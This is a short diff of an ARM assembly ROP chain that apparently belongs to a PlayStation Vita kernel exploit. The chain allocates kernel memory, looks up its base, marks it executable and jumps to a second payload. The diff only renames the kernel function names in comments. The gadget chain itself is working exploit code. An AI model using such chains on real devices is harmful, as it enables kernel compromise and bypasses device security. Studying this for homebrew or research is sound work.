@@ -23,7 +23,7 @@ allocate_code_memory:
   .word      0xDEADBEEF @ r5 = dummy
   .word BASE+0x00000031 @ pop {r0, pc}
   .word BASE+0x00027913 @ r0 = "Magic"
-  .word BASE+0x0000a523 @ sceKernelAllocMemBlockForKernel(r0 = "Magic", r1 = 0x1020D006, r2 = 0xA0000, r3 = NULL) @ pop {r4,pc}
+  .word BASE+0x0000a523 @ ksceKernelAllocMemBlock(r0 = "Magic", r1 = 0x1020D006, r2 = 0xA0000, r3 = NULL) @ pop {r4,pc}
   .word      0xDEADBEEF @ r4 = dummy
 
 get_memory_base:
@@ -217,7 +217,7 @@ mark_executable:
   .word BASE+0x0001bf47 @ movs r1, #0 @ bx lr
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
-  .word BASE+0x0000af33 @ sceKernelFindMemBlockByAddrForDriver(r0 = base, r1 = 0); pop {r3, r4, r5, pc}
+  .word BASE+0x0000af33 @ ksceKernelFindMemBlockByAddr(r0 = base, r1 = 0); pop {r3, r4, r5, pc}
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word      0xDEADBEEF @ r4 = dummy
   .word SECOND_PAYLOAD  @ r5 = dummy
